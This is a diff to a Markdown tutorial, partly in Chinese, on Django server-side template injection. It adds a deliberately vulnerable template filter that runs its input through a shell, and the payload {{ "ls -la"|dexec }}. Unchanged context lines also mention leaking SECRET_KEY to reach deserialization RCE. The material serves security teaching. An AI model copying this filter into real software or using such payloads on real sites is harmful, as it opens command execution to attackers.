@@ -6,7 +6,7 @@
 $ pip install django
 ```
 
-## Vulnerable Code
+## Vulnerable Code I
 
 ```python
 import traceback
@@ -32,7 +32,7 @@ while True:
         print(s)
 ```
 
-## Exploit
+## Exploit I
 
 沒辦法直接RCE, 只能看看當前 context 有什麼變數
 
@@ -56,3 +56,43 @@ settings 猜測是 django 的 settings.py, 因此有機會拿到 settings.SECRET
 就有機會用反序列化 RCE
 - https://rickgray.me/2015/09/12/django-command-execution-analysis/
 ```
+
+## Vulnerable Code II
+
+run.py
+```
+TEMPLATES = [
+    {
+        'BACKEND': 'django.template.backends.django.DjangoTemplates',
+        'DIRS': [],
+        'OPTIONS': {
+            'builtins': [
+                'vuln_code',
+            ]
+        }
+    }
+]
+```
+
+vuln\_code.py
+```
+import subprocess
+from django import template
+
+register = template.Library()
+
+@register.filter
+def dexec(string):
+    p = subprocess.Popen(string, shell=True, stdout=-1)
+    return p.communicate()[0]
+```
+
+## Exploit II
+
+平常應該遇不到這種配置, 自定義的 filter 存在執行 command 的能力.
+不過也不是沒有可能, 也許會有人自定義 filter 執行查詢功能, 不小心開啟了 Command Injection 之類
+
+```
+{{ "ls -la"|dexec }}
+```
+
